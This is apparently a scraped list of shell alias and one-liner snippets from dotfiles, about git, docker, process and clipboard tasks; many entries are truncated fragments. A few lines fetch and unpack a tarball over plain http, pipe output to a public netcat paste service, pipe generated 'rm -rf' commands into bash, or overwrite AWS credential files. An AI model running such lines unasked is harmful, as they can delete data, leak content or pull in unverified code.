"_() { ish=${1-HEAD}; if [ -n ""`git rev-parse --verify $ish`"" ]; then ver=`(git describe $ish || git describe --tags $ish) 2> /dev/null`; if [ -n ""$ver"" ]; then if [ -n ""$2"" ]; then file=`echo $2 | sed ""s/\(.*\)\.zip/\1/;s/.*/&.zip/""`; else file=`basename \`git rev-parse --show-toplevel\``""-$ver"".zip; fi; if [ ! -f ""$file"" ]; then git archive ""$ish"" --format=zip --prefix=""$ish/"" -o ""$file""; else echo ""File \""$file\"" already exists. Use \""gstac!\"" force archiving. ""; fi; else echo ""No tags can describe this commit. ""; fi; fi; }; _"
"_() { ish=${1-HEAD}; if [ -n ""`git rev-parse --verify $ish`"" ]; then ver=`(git describe $ish || git describe --tags $ish) 2> /dev/null`; if [ -n ""$ver"" ]; then if [ -n ""$2"" ]; then file=`echo $2 | sed ""s/\(.*\)\.tgz/\1/;s/.*/&.tgz/""`; else file=`basename \`git rev-parse --show-toplevel\``""-$ver"".tgz; fi; if [ ! -f ""$file"" ]; then git archive ""$ish"" --format=tgz --prefix=""$ish/"" -o ""$file""; else echo ""File \""$file\"" already exists. Use \""gstac!\"" force archiving. ""; fi; else echo ""No tags can describe this commit. ""; fi; fi; }; _"
"_() { ish=${1-HEAD}; if [ -n ""`git rev-parse --verify $ish`"" ]; then ver=`(git describe $ish || git describe --tags $ish) 2> /dev/null`; if [ -n ""$ver"" ]; then if [ -n ""$2"" ]; then file=`echo $2 | sed ""s/\(.*\)\.tar/\1/;s/.*/&.tar/""`; else file=`basename \`git rev-parse --show-toplevel\``""-$ver"".tar; fi; if [ ! -f ""$file"" ]; then git archive ""$ish"" --format=tar --prefix=""$ish/"" -o ""$file""; else echo ""File \""$file\"" already exists. Use \""gstac!\"" force archiving. ""; fi; else echo ""No tags can describe this commit. ""; fi; fi; }; _"
"_() { ish=${1-HEAD}; if [ -n ""`git rev-parse --verify $ish`"" ]; then ver=`(git describe $ish || git describe --tags $ish) 2> /dev/null`; if [ -n ""$ver"" ]; then if [ -n ""$2"" ]; then file=`echo $2 | sed ""s/\(.*\)\.tar.gz/\1/;s/.*/&.tar.gz/""`; else file=`basename \`git rev-parse --show-toplevel\``""-$ver"".tar.gz; fi; if [ ! -f ""$file"" ]; then git archive ""$ish"" --format=tar.gz --prefix=""$ish/"" -o ""$file""; else echo ""File \""$file\"" already exists. Use \""gstac!\"" force archiving. ""; fi; else echo ""No tags can describe this commit. ""; fi; fi; }; _"
"\xprop | egrep ""WM_CLASS|PID|\<WM_ICON_NAME"""
"\ps -e -o pid,%cpu,%mem,command | tail -n +2 | sort -nr -k 3 | head -10"
"\ps -e -o pid,%cpu,%mem,command | tail -n +2 | sort -nr -k 2 | head -10"
"\ls -R | \grep "":\$"" | sed -e ""s/:\$//"" -e ""s/[^-][^\\/]*\\//--/g"" -e ""s/^/ /"" -e ""s/-/|/"""
"\cat ~/.zsh_history | tail -n 2 | head -1 | cut -d "";"" -f 2"
"\\\""curl -s http://monip.org | perl -ape 's/<[^>]+>/ /mg; s/ +/ /mg'| grep \\\\\\\"" IP \\\\\\\"" --color=never | perl -ape 's{ IP : (\S+) (\S+) (.*)}{\\\\\\\$1\\n\\\\\\\$2\\n\\\\\\\$3}'\\\""\"" >> $HOME_USER/.bashrc && echo 'monip' >> $HOME_USER/.bashrc """
"\'for c in `brew cask list`; do ! brew cask info $c | grep -qF \""Not installed\"" || brew cask install $c; done\'' >> ~/.bash_profile"
"\'\(.*\)\'/\1#\2/"" | column -t -s $'#' 2>/dev/null | fzf | sed ""s/^[^ ]* *//"")"""
"\""tmux attach || tmux new\"""" | tee -a $HOME/.bash_aliases"
"\""sudo kill \\\$(ps aux | grep openconnect | grep -v grep | awk '{print \\\$2}')\"""" >> ~/.zshrc"
"\""pacman -Sgg | grep blackarch | cut -d ' ' -f2 | sort -u\"""" >> ${EXT_SDCARD}/.bashrc"
"\""git diff | grep // && git diff | grep console. && git diff | grep TODO\"""" >> $HOME/.zshrc"
"\""git config --get-regexp \""alias.*\"" | colrm 1 6 | sed \""s/[ ]/ = /\"" | sort\"""" >> ~/.bash_alias"
"\""docker ps -a | grep Exited | cut -d ' ' -f 1 | xargs docker rm\"""";"
"\""cd \$(ghq list -p | peco)\"""" /target-home/.bashrc || \"
"\""cat /var/lib/dhclient/dhclient-eth0.leases|grep domain-name-servers|tail -1|awk '{print \\\""dns is\t\\\"",\\\$3}'\"""">>~/.bashrc"
"\""bleachbit --list | grep -E \""[a-z]+\.[a-z]+\"" | grep -v system.free_disk_space | xargs bleachbit --clean\"""" >> ~/.bashrc"
"\""bleachbit --list | grep -E \""[a-z]+\.[a-z]+\"" | grep -v system.free_disk_space | xargs bleachbit --clean\"""" >> /home/crash/.bashrc"
"\""${nucli} stack current --env $env | jq '.prototypes | .[]' | xargs\"""""
"[[ -n $(git branch --merged master | grep -v ""^[ *]*master$"") ]] && git branch --merged master | grep -v ""^[ *]*master$"" | xargs git branch -d"
"[[ -f /var/log/nginx/error.log ]] && { tail -n500 /var/log/nginx/error.log | \less -RS; } || echo -e ""\033[1;48;5;196m/var/log/nginx/error.log doesnt exist or is not readable\033[0m"""
"[[ -f /var/log/nginx/access.log ]] && { tail -n500 /var/log/nginx/access.log | \less -RS; } || echo -e ""\033[1;48;5;196m/var/log/nginx/access.log doesnt exist or is not readable\033[0m"""
"[[ $__oo__insideTryCatch -eq 0 ]] || __oo__presetShellOpts=""$(echo $- | sed "
"[[ ""$(echo quit | timeout --signal=9 2 telnet git.lo 22 2>&1)"" == *""Connected to git.lo""* ]] && echo Connected || echo Disconnected"
"[ -n $(tmux ls | grep -n ""attached"") ] && reboot || tmux detach && reboot"
"[ -d .git ] && { git archive --format=tar HEAD | bzip2 -9 - > ""../$(basename $(pwd))_$(date --utc +%Y-%m-%d_%H-%M-%S).tar.bz2""; } || { echo ""No .git subdirectory detected.""; }"
"VENV=$(basename ""$PWD"") && ((lsvirtualenv -b | grep ""^$VENV\$"") || mkvirtualenv ""$VENV"") && workon ""$VENV"""
"VBoxManage list vms -l | grep -e ^Name: -e ^State | sed ""s/Name:[ ]*\(.*\)/\1 \//;s/State:[\ ]*//"" | paste -d "" "" - -"
"VBoxManage list vms -l | egrep ""^Name:|^State:"" | grep -v ""Host path"""
"VBoxManage list runningvms | \grep -Eo ""^\""(.+)_[0-9]+\"""" | \sed -E ""s/_[0-9]+\""$//g"" | \sed ""s/\""//"""
"VAR=`echo ""select response_token from Subscriptions where profile_id = 1 order by profile_id desc limit 1"" | heroku pg:psql -a hoe-gek-is-nederland | sed -n 3p | tr -d "" ""`; open ""https://hoegekis.nl/dagboekonderzoek?id=$VAR"""
"TMPH=`history -rn 1 | peco`; echo $TMPH; echo $TMPH | tr -d ""\n"" | pbcopy"
"SSH_AUTH_SOCK=""$(find $(ls -ldt /tmp/ssh-* | fgrep $USER | head -1 | perl -npae "
"SSH_AUTH_SOCK=""$(find $(ls --color=none -ldt /tmp/ssh-* | fgrep $USER | head -1 | perl -npae "
"SKIP_POST_CHECKOUT=1 git rebase \$(gba | grep -v ""HEAD"" | peco | tr -d "
"RANGE=$(git -c color.ui=always pull | tee /dev/tty | grep ""^Updating .*\.\."" | sed ""s/Updating //""); if [ ""$RANGE"" != """" ]; then tig $RANGE; fi"
"PYENV_VERSION=""3.5.2"" pip install --upgrade pip; PYENV_VERSION=""3.5.2"" pip freeze --local | grep -v ^-e | cut -d = -f 1 | PYENV_VERSION=""3.5.2"" xargs -n1 pip install -U"
"PYENV_VERSION=""2.7.14"" pip install --upgrade pip; PYENV_VERSION=""2.7.14"" pip freeze --local | grep -v ^-e | cut -d = -f 1 | PYENV_VERSION=""2.7.14"" xargs -n1 pip install -U"
"LC_ALL=C tr -dc ""[:alpha:][:alnum:]"" < /dev/urandom | head -c 20 | pbcopy | echo ""Password copied to clipboard"""
"LC_ALL=C cpufreq-info | grep -o ""governor \"".\+\"""" | sed ""s/.\+\""\([^\""]\+\)\""/\1/"" | uniq"
"LANG=en_US git branch -r --merged | grep -v master | sed ""s/origin\///"" | xargs -n 1 git push --delete origin"
"LANG=en_US git branch -r --merged | grep -v master | sed ""s/origin\///"" | xargs -n 1 echo"
"LANG=C du -s /{{boot,lib*,opt,sbin,tmp,usr,var}/*(N),{bin,etc,root}} 2>/dev/null | grep -vE '^(0|[0-9.]+K)' | LANG=C sort -h"
"LANG=C LC_ALL=C sed -i s""|/Registry (Adobe) /Ordering (Korea1) /Supplement [0-9]|/Registry(Adobe) /Ordering(Identity) /Supplement 0|g"""
"GITHUB_HOST=ghe.kst3.jp hub browse $(find ~/src -follow -maxdepth 3 -mindepth 3 -type d | cut -d ""/"" -f 5- | fzf | cut -d ""/"" -f 2,3)"
"FOLDER=~/chrome-profiles/$(date +%s | sha256sum | base64 | head -c 4) && google-chrome --user-data-dir=""$FOLDER"" && echo $FOLDER"
"CURRENT_KERNEL=`uname -r` ; rpm -qav | grep kernel-[2-4] | sort -V | while read -r LINE ; do if [ ""$LINE"" == ""kernel-$CURRENT_KERNEL"" ]; then echo ""$LINE <active>"" ; else echo ""$LINE"" ; fi done"
"CURRENTDISPLAY=$(xrandr | grep "" connected"" | egrep -vi ""primary"" | cut -f1 -d "" "") ; xrandr --output ${CURRENTDISPLAY} --brightness 1"
"CPWD=`pwd`;find $CPWD -regex "".*\.[c,h][pp|xx]*"" |grep -v rpmbuild |grep -v build > cscope.files; cscope -bRql;\
"CLICOLOR_FORCE=true ls -lAGh | grep ""^d"" && ls -lAGH | grep ""^[^d|t]"""
"/usr/local/go/src/github.com/wolkdb/plasma/build/bin/swarmdb --datadir /usr/local/swarmdb/data account list 2> /dev/null | awk ""{print$3}"" | cut -d ""{"" -f2 | cut -d ""}"" -f1"
"/usr/local/bin/qdel `/usr/local/bin/mshow | grep syoung | grep Idle | cut -c 1,2,3,4,5,6`"
"/usr/libexec/java_home -Vq 2>&1 | grep -E '\d\.\d\.\d(_\d+)?.*,' | cut -d , -f 1 | cut -c 5-"
"/usr/bin/tree --dirsfirst -aFI ""node_modules|.git|.vagrant|.npm"""
"/usr/bin/sudo /usr/bin/jinfo `ps aux | grep catalina | grep ""^tomcat7"" | cut -d"" "" -f 3`"
"/usr/bin/arp-scan -l -I $(ifconfig | grep -B1 ""inet""|grep -i ether|cut -f1 -d"" "")"
"/sbin/ifconfig|\grep ""inet""|perl -pe ""s/^\s+\w+(\s*addr?:|\s+)(\S+)\s.*/\$2/"""
"/sbin/ifconfig eth0 | grep ""addr:"" | sed -e ""s/^.*addr://"" |sed -e ""s/ Bcast.*//"" "
"/sbin/ifconfig en1 | egrep ""inet [0-9.]+"" -o | sed -e ""s/inet //"" | pbcopy && pbpaste"
"/sbin/ifconfig -a | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet6? (addr:)? ?/, \"
"/root/go/src/github.com/wolkdb/plasma/build/bin/plasma-gw --datadir /root/data account list 2> /dev/null | awk ""{print$3}"" | cut -d ""{"" -f2 | cut -d ""}"" -f1"
"/bin/tree ~/ -fdQ | fzy | sed ""s/\W*//"" | sed ""s/\""//"" "
"/bin/ps -ux --forest | /usr/bin/head -1; /bin/ps -ux --forest | /bin/grep -v ""color"" | /bin/grep --color=auto"
"/bin/ps -eo ""user s pri pid ppid pcpu pmem vsz rss stime time nlwp psr args"" |grep amit|grep -v grep|grep -v ps"
"/bin/ls -tr /volatile/logs/*_send_recv_* | tail -1 | xargs tail -f | sed -u ""s/\x01/ /g"""
"/bin/ls -1 | awk ""{print length, \$0}"" | sort -n | awk ""{print \$2}"""
"./platforms/android/cordova/log | grep -E ""Plugin|Cordova|chromium"""
".*|alias $NAME='. $SOURCE'g"" ~/.bashrc) || (echo ""alias $NAME='. $SOURCE'"" >> ~/.bashrc)"
"(type pyenv &>/dev/null && ""$(pyenv root)/versions/$(pyenv global | grep python3)/bin/python"") || python3"
"(ssh-add -l | grep -q ""id_dsa"" || ssh-add ~/.ssh/id_dsa); ssh"
"(ssh-add -l | grep -q ""id_dsa"" || ssh-add ~/.ssh/id_dsa); scp"
"(set -o | grep emacs.*on >/dev/null 2>&1 && echo ""emacs mode"" || echo ""vi mode"")"
"(lsof -n -i4TCP:9000 | grep LISTEN | awk ""/LISTEN/ {print \$2}"" | xargs kill -9) && sudo rm /Users/patrick/npl/RUNNING_PID"
"(lpass status || lpass login jclark@newrelic.com) && (lpass show ""CHI VPN"" --notes | newrelic-chi-vpn)"
"(ifconfig -a |grep ""inet ""|tail -1)|cut -f 2 -d "" "" "
"(git stash --include-untracked | grep -v ""No local changes to save"") && gpp && git stash pop || echo ""Fail!"""
"(git stash --include-untracked | grep -v ""No local changes to save"") && .gpp && git stash pop || echo ""Fail!"""
"(git log --oneline master..HEAD | grep -ei wip) || echo ""ok"""
"(git config --get-regexp alias | sed -r s/""alias\.([^ ]+) (.*)""/""git \1\t\2""/ & alias | grep git) | sort"
"(for i in `git branch | colrm 1 2` ; do echo `git log --date=iso8601 -n 1 --pretty=""format:%ai@@%h@@%an@@%s"" $i`@@$i ; done) | sort -r | awk -v B=`tput setab 4` -v N=`tput setab 0` -F""@@"" "
"(echo FileSystem MountPoint Type Options; mount | cut -d\ -f1,3,5,6 | tr -d '()') | column -t"
"(echo -e ""# Generated by $(pylint --version | grep -i pylint | sed ""s>[ ,]*$>>"")\n""; pylint --generate-rcfile | sed ""s>^[^\[#]>#&>"") > .pylintrc"
"(docker ps -q --filter ""status=exited"" || echo :) | xargs docker rm"
"(docker images -aq --filter ""dangling=true"" || echo :) | xargs docker rmi"
"(cd ~/.byebye; find . -type f -name ""check-*"" | while read script; do $script || echo $script returned non-zero; done)"
"(cd /etc/mail/domains; for file in [a-z]*; do echo `whois $file | grep expires | sed -e ""s/.* \([0-9]*\)-\([a-zA-Z]*\)-\([0-9]*\).*/\3-\2-\1/;s/Jan/01/;s/Feb/02/;s/Mar/03/;s/Apr/04/;s/May/05/;s/Jun/06/;s/Jul/07/;s/Aug/08/;s/Sep/09/;s/Oct/10/;s/Nov/11/;s/Dec/12/""`"" : $file""; done) | sort"
"(cd /etc/exim/domains; for file in [a-z]*; do echo `whois $file | grep expires | sed -e ""s/.* \([0-9]*\)-\([a-zA-Z]*\)-\([0-9]*\).*/\3-\2-\1/""`"" : $file""; done) | tr "
"(cd $SB; echo ""stdout only"" ; echo -e ""\n======-=======\n""; pwd ; date; jgit show | egrep -e ""^(>>|commit)"" | tr -s ""\n>"" ""\t\n"" ; echo ; jgit br*)"
"(bind -P | grep -v ""is not bound"" | nl |
"([^'\"";]+|'.+'|\"".*\"") *;?"" | awk '{gsub("";$"","""");print}'"
"(IFS=""""; while read thisLine; do [[ ${#thisLine} -eq 0 ]] && echo || echo ""$(tput bold)${thisLine%% *}$(tput sgr0) ${thisLine#* }""; done < /usr/local/etc/a2cloud-help.txt | more)"
"(){cd `pwd``find . -type f | grep -m1 $1 | perl -pe ""s/(^\.|\/[^\/]*$)//g""`}"
"(){ if [ -n ""${1}"" ];then cat $1|sed ""s/,/ ,/g""|column -t -s,|less -S; else echo ""please specify csv file""; fi }"
"(){ cat /dev/urandom | LC_CTYPE=C tr -dc ""0-9a-zA-Z"" | fold -w $1 | head -n 1 }"
"((svn info &> /dev/null && svn up) || (echo; echo -n ""svn repository not detected, use tbz2? [Y,n]: ""; read y; [ ""$y"" == """" -o ""$y"" == ""y"" -o ""$y"" == ""Y"" ] && (wget -O - http://cf.telaranrhiod.com/files/common/common_files.tbz2 | tar -xjov --no-same-permissions ./))); exec bash"
"('|\"").*\.(sh|py)('|\"")"" >/dev/null 2>/dev/null"
"( find . -type l | xargs file ) | grep ""broken symbolic link"" | tee broken2.txt"
"${PIP} freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 sudo -H ${PIP} install --upgrade"
"${PIP} freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 ${PIP} install --upgrade"
"${CENAME} | grep -v -i none | awk '{print $NF}' | tail -n 1`"""
"${CENAME} --cache --cache-timeout 3600 | grep -v -i none | awk '{print $NF}' | tail -n 1`"""
"$CAKE_PROJECT_ROOT/bin/cake test app --app $CAKE_PROJECT_ROOT/app $(find $CAKE_PROJECT_ROOT/app/Test/Case -name ""*Test.php"" | cut -b 36- | sed ""s/Test.php//g"" | sk)"
"$(which find) . -xdev $prunePathsFindExpression -type f -size +10M -exec ls -l --block-size=M --time-style=+""%Y-%m-%d %T"" {} \; 2>/dev/null | sort -nrk5 | head -n | awk "
"$(which find) . -xdev $prunePathsFindExpression -type f -size +10M -exec ls -l --block-size=M --time-style=+""%Y-%m-%d %T"" {} \; 2>/dev/null | sort -nrk5 | head -50 | awk "
"$(which find) . -xdev $prunePathsFindExpression -type f -size +10M -exec ls -l --block-size=M --time-style=+""%Y-%m-%d %T"" {} \; 2>/dev/null | sort -nrk5 | head -5 | awk "
"$(which find) . -xdev $prunePathsFindExpression -type f -size +10M -exec ls -l --block-size=M --time-style=+""%Y-%m-%d %T"" {} \; 2>/dev/null | sort -nrk5 | head -10 | awk "
"$(ls -F | grep -v ""/$"" | fzf --multi --prompt ""Files> "" | sed -e ""s/*//"" )"
"$(kill -9 `ps -eo pid,comm | grep vim | egrep -o ""[0-9]+"" | tr ""\n"" "" ""`)"
"$(ifconfig | awk '/inet/ {if ($2!~/127.0|:$/) print $2}' | awk -F: '{print ""echo ""$2}');"
"$(history | tail -1 | sed ""s/^ *[0-9]\+ *//g"") | less"
"$(gll | fzf | sed -E ""s/^[*\\/| ]+(\w+) .*$/\1/"")"
"$(gll BR | fzf | sed -E ""s/^[*\\/| ]+(\w+) .*$/\1/"")"
"$(git stash list | grep $(git rev-parse --symbolic-full-name --abbrev-ref ""@{u}"" | sed ""s#\w*/##"") | sed ""s/\(stash@{.*}\):.*/\1/"")"
"$(git log --oneline | fzf --no-sort --preview ""sh -c \""git --no-pager show $(echo {} | cut -b 1)\"""" --prompt ""Git Revisions> "" | cut -f 1 -d "" "") "
"$(git for-each-ref --format=""%(refname)"" refs/heads refs/remotes | peco --prompt ""GIT BRANCH>"" | perl -pne ""s{^refs/(heads|remotes)/}{}"")"
"$(git branch | fzf-branch | fzf --multi --preview=""git fzflog {}"" --prompt ""Local Branches>"" | sed -e ""s/^\*\s*//g"")"
"$(git branch -r | fzf-branch | fzf --multi --preview=""git fzflog {}"" --prompt ""Remote Branches>"" | sed -e ""s/^\*\s*//g"")"
"$(git branch -a | fzf-branch | fzf --multi --preview=""git fzflog {}"" --prompt ""All Branches>"" | sed -e ""s/^\*\s*//g"")"
"$(find ~/Downloads -name ""$(ls -lrt ~/Downloads/ | tr -s ' ' | cut -d' ' -f9 | tail -n1)"")"
"$(echo "" ps -ef | egrep detection.x | egrep -v egrep | awk '{print $2}'"")"
"$(docker ps | tail -n +2 | peco | cut -d "" "" -f 1)"
"$(docker ps | tail -n +2 | peco --layout bottom-up | cut -d"" "" -f1)"
"$(docker ps -a | tail -n +2 | peco | cut -d "" "" -f 1)"
"$(docker ps -a | tail -n +2 | peco --layout bottom-up | cut -d"" "" -f1)"
"$(curl -sL https://api.github.com/users/hamaco/repos | jq -r "".[].full_name"" | peco --prompt ""GITHUB REPO>"" | head -n 1)"
"$(cd $PASSWORD_STORE_DIR ;find -name ""*.gpg"" |sed ""s/\.gpg$//"" | sed ""s/^\.\///"" |peco)"
"$((git ls-tree -r --name-only HEAD || find . -path ""*/\.*"" -prune -o -type f -print -o -type l -print) 2> /dev/null | peco --query ""$*"")"
"$'watch -n 1 ""gpustat ; sensors | grep \'\\(temp\\|fan\\)\' ; cat /proc/cpuinfo | grep -i mhz""'"
"$'top -bn 2 -d 0,1 | grep \'^%Cpu\' | tail -n 1 | gawk \'{print ($2+$4+$6)*0.04}\''"
"$'history | awk \'{a[$2]++}END{for(i in a){print a[i] "" "" i}}\' | sort -rn | head'"
"$'gs | grep \'??\' | awk -F \' \' \'{ print ""rm -rf ""$2 }\' | bash'"
"$'git status -s | grep -i \'^??\' | sed \'s/ /\\ /g\' | awk \'{system(""rm ""$2)}\''"
"$'git branch | grep ""*"" | awk \'{ print $2 }\' | xargs git push --set-upstream origin' # Push a branch for the first time"
"$'git branch | grep ""*"" | awk \'{ print $2 }\' | pbcopy' # Copy branch name"
"$'docker images | grep -v REPOSITORY | awk \'{printf(""%s:%s\\n"", $1, $2)}\' | xargs -L1 docker pull'"
"$' \\\n docker ps --no-trunc -aqf ""status=exited"" | xargs docker rm ; \\\n docker images --no-trunc -aqf ""dangling=true"" | xargs docker rmi ; \\\n docker volume ls -qf ""dangling=true"" | xargs docker volume rm'"
""state|to\ full|to\ empty|percentage"""
"""$(ps ax | tac | peco | ruby -pale ""\$_=\$F[0]"")"""
"!""git ls-files | xargs notes | awk -F: '{ print $1,$2; print $3,$4; print $5}' | grcat ~/.grc.d/notes """
" { echo ""# Docker containers"" ; sudo docker ps | tail -n +2 | while read cid restOfLine; do echo $cid; done | xargs sudo docker inspect --format ""{{ .NetworkSettings.IPAddress }} {{ .Config.Hostname }}.{{ .Config.Domainname }}""; }"
" vgdisplay | egrep ""Volume group|VG Name| PE"""
" tree -L 3 -d -I ""vendor|cache|log|logs"""
" sudo lsof -i tcp:8080 | grep -v grep | awk '{print $2}' | xargs kill -9 ; \
" lvdisplay | egrep ""Logical|Name|Size"""
" env | egrep ""ROS_.*=|PYTHONPATH|LD_LIBRARY"" "
" dmesg | grep -i ""wf"" | grep -E ""firmware|Label"" "
" config | grep overlay | grep -E ""sdio|spi"" "
" clear ; echo ; hostname ; ip addr show | grep --color=never ""inet "" | grep -v ""127.0.0.1"" | awk "
!git config --list | grep 'alias\\.' | sed 's/alias\\.\\([^=]*\\)=\\(.*\\)/\\1\\\t => \\2/' | sort
!git checkout master && git pull origin master && git branch | egrep -v '(master|release_candidate)|xargs git branch -D' kmerge = mergetool -t kdiff3 kdiff = difft
!git checkout master && git pull origin master && git branch | egrep -v '(master|release_candidate)|xargs git branch -D'
!git branch | cut -c 3- | fzf --reverse --preview 'git show {}' | xargs git checkout
! f() { git for-each-ref refs/heads/ '--format=%(refname:short)' | xargs -I {} git is-unmerged {} ${1-master} | egrep '^-' | cut -f2 -d' ' ; }; f
’ls -GF’ || alias ls=’ls -G’
’du -cks err.txt generated.file succ.txt | sort -rn|head -11′
~/wallpaper.sh || \i3lock
~/spin' ~/.bashrc || echo 'alias spin=~/spin' >> ~/.bashrc
~/bin/ym $(aws ls -1 yermama | fzf) | pbcopy
~/Library/Android/sdk/emulator/emulator -list-avds | peco | xargs ~/Library/Android/sdk/emulator/emulator -avd
~/Code/Status/cmus.sh || ~/Code/Status/pianobar.sh
~/.zshrc || echo
~/.currentbrightness ~/.upamt | paste -sd+ | bc)"
~/.currentbrightness ~/.downamt | paste -sd+ | bc)"
~/.bashrc || echo alias bag=\
~/.bashrc || echo
~/.bash_aliases || echo
~/.bash_aliases > /dev/null || echo alias
} || die 'LOCAL: init lost'; _Msh_sL_temp \
|| zenerror $?
|| echo 'alias k=
|| echo ""You have nothing with which to dig"""
||
|xargs -n 1 |xargs -o -I@
|xargs -n 1 |xargs --open-tty --verbose --no-run-if-empty -I@
|vipe|
|vimpager --pipe-edit|
|tee tee.log |less
|tee >/dev/tty|xsel -ib
|tee >/dev/tty|xsel -ab
|sort|less
|sort |uniq
|sort | less
|sort -f|uniq -c
|python -mjson.tool |less
|peco|xargs
|peco|
|paste -sd+|bc
|lv|cat
|grep -vE '^\s*(#|$)'
|expand-elastic|less
|diff-highlight |${=PAGER}
|(cat 1>&2|xsel -bi)2>&1
|& tr '\n' '\0' | xargs -0
|& logger &|
| {date|isodatesec} \
| xclip -i -selection primary -f | xclip -i -selection clipboard
| xclip -i -sel p -f | xclip -i -sel c
| xclip && xclip -o | xclip -se c
| xargs echo -n | pbcopy
| xargs cat |
| xargs -o | vim --not-a-term
| wc -l | tr -d ' '
| wc -l | human-number
| vipe |
| uniq -c | sort -nrk 1
| tyy | clip
| tr -d '\n' | pbcopy
| tr '\n' '\0' | xargs -0 -n 10000 mpv --no-resume-playback
| tr '\n' ' ' | xclip -in -selection clipboard
| tee /tmp/paste; fixssh; sleep 1; cat /tmp/paste | pbcopy
| tee /tmp/cmdoutput | cat -n
| tee /dev/tty | pbcopy
| tee /dev/tty |
| sort | uniq -d
| sort | uniq -c
| sort | uniq
| sort | less
| sort -n | uniq -c
| sort -n | less
| sed -n ${i}p | xargs emacsclient -n
| sed 's/^-\\([^-]*\\)/\\x1b[31;1m-\\1/;s/^+\\([^+]*\\)/\\x1b[32;1m+\\1/;s/^@/\\x1b[36;1m@/;s/$/\\x1b[0m/' | less -r
| sed 's/^-\\([^-]*\\)/\\x1b[31;1m-\\1/;s/^+\\([^+]*\\)/\\x1b[32;1m+\\1/;s/^@/\\x1b[36;1m@/;s/$/\\x1b[0m/' | less -SR
| sed 's/\\\\/\\\\\\\\/g' | sed \
| s2t | cut -f
| ruby -pe 'chomp if STDIN.eof?' | pbcopy
| python -mjson.tool | vim -R +'set ft=javascript' -
| python -m json.tool | pygmentize -l json
| pygmentize | less
| pygmentize -g -O style=monokai | less
| pv -trab |
| pprint | less
| perl -pe 's/\e\[?.*?[\@-~]//g' | xargs -I{}
| percol --match-method regex | xargs
| peco | xargs
| one-line-strip | tmux load-buffer -
| nkf -w | pbcopy
| nkf -Lu | lv
| nc termbin.com 9999 | clipboard
| juman | knp -tab -print-num
| json_pp | less
| jq . | less -XSFR
| jq . | less
| jq . -C | less -R
| jq -SC . | less
| jq -C . | less -SR
| jq -C . | less -R -X
| jq -C . | less -R
| jq -C . | less -F
| jq -C . | less
| jq -C '.' | less -R
| iconv -f utf8 -t gb18030 -c | less
| iconv -f utf-8 -t sjis | pbcopy
| iconv -f gb18030 -t utf8 -c | less
| iconv -f euc-jp -t sjis | pbcopy
| iconv -f UTF-8 -t UCS-4BE | xxd
| hexdump -C | less
| grep|
| grep -v grep | grep --color=auto
| grep -v grep | grep --color -i
| grep -v grep | grep
| grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'"
| fzf | xargs
| fzf |
| fgrep -v grep | grep
| fgrep -v grep | egrep --color
| emojify | tw --pipe
| egrep -v ${IGNORES}\|${OBJS}
| diff-so-fancy | less --tabs=4 -RFX
| cut -f 1 -d\ | paste -s -d ' '
| cut -c -$((COLUMNS - 5)) | tail -n $((LINES - 5))
| cut -c -$((COLUMNS - 5)) | head -n $((LINES - 5))
| comm -23 - <(pacman -Qgq base base-devel plasma | sort)"
| colorize diff | less -R
| colordiff | less -R
| colordiff | less
| colordiff -c |& less -R
| col -bx | vim -R -
| col -bx | pbcopy-wrapper
| col -b | vim -R -
| ccat | vless
| cat_alias | less
| bzip2 -9 | base64 -w0
| awk '{print \$2}' | xargs kill \$@ }"
| awk '{print \$2}' | xargs kill -9
| add-index --input-type tree --print-indexables | set-index-variables
| add-index --input-type mixed --print-indexables | set-index-variables
| add-index --input-type list --print-indexables | set-index-variables
| --help | less
| (cat 1>&2 | xsel -bi) 2>&1
| $FILTER_CMD $FILTER_OPTS $FILTER_OPTS | xargs
| $COL_CMD | pbcopy-wrapper
| $COL_CMD | $EDITOR_VIM_MIN -
{echo 'system:' && echo /etc/xdg/autostart/xdg-user-dirs.desktop | tr ' ' '\n' && echo 'user:' && echo /home/martin/.config/autostart/* | tr ' ' '\n'}
{ sys::_Die || return 1 ; } 5<<<'
{ sys::_Chk || return 1 ; }'
{ sleep 2; $BROWSER http://localhost:8088/@frames; } & pgrep pod_server || { pod_server -s left -f ${1:-perl}; sleep 1; };
{ hostname -I|awk '{print \$NF}';pwd; } | awk '{printf \
{ git diff --name-only ; git diff --name-only --staged ; git ls-files --other --exclude-standard } | sort | uniq
{ git branch | grep \*; gsha; } | clip.exe
{ git br --contains master; git br; } | sort | uniq -u
{ env; set; }|sort -u|egrep -a
{ dquilt pop -a || [ $? = 2 ]; } && debcommit
{ cd '/Users/xeno_by/Projects/8131' && (for i in {1..100}; do parallel -j 50 scala -J-Xms1G -J-Xmx1G Test ::: {1..10} || break; printf . ;done); }
zixiepkillapp(){ ps -aux | grep -i $1 | zixiepkillappsubcommand};zixiepkillapp
zign token | tee /dev/stderr | pbcopy
zathura Downloads/$(ls -t Downloads | grep .pdf | head -1) & die
z tts ; fgrep C /etc/hosts | fzf | read ip host; ./tts-run connect $host
youtube-viewer --results=$([ $(($(tput lines)-4)) -le 50 ] && echo $(($(tput lines)-4)) || print 50)
youtube-dl -j --flat-playlist \$YT_PLAYLIST | jq -r '.id' | sed 's_^_https://youtu.be/_'
yolk -U|cut -d ' ' -f 1|xargs pip install --upgrade
yolk -U | awk {'print $1'} | xargs pip install -U
ykman oath code AWS | grep -Eo '[0-9]{6}' | pbcopy
yes | sudo pacman -Syu && yes | sudo pacman -Sc
yes | sudo dnf update && yes | sudo dnf upgrade --refresh
yes | cp ~/.aws/blugento.config ~/.aws/config && yes | cp ~/.aws/blugento.credentials ~/.aws/credentials
yes y | docker system prune; yes y | docker volume prune
yes hr | head -n 20 | bash
yes hackerman |toilet | lolcat -ad 1
yes FINISHED | head | xargs figlet
yes 2>&1 | while read line ; do echo $line | say ; done
yeaaaaaaah || flip-table
yay -Slq | fzf -m --preview 'yay -Si {1}'| xargs -ro yay -S
yay -Slq | fzf -m --preview 'yay -Si {1}' | yay -Si -
yay -Slq | fzf -m --preview 'yay -Si {1}' | yay -S -
yay -Slq | fzf -m --preview 'yay -Si {1}' | xargs -ro yay -S
yay -Slq | fzf -m --preview 'yay -Si {1}' | xargs -r sudo yay -S
yay -Qqet |grep -- -git |xargs yay --needed --noconfirm -Syyu
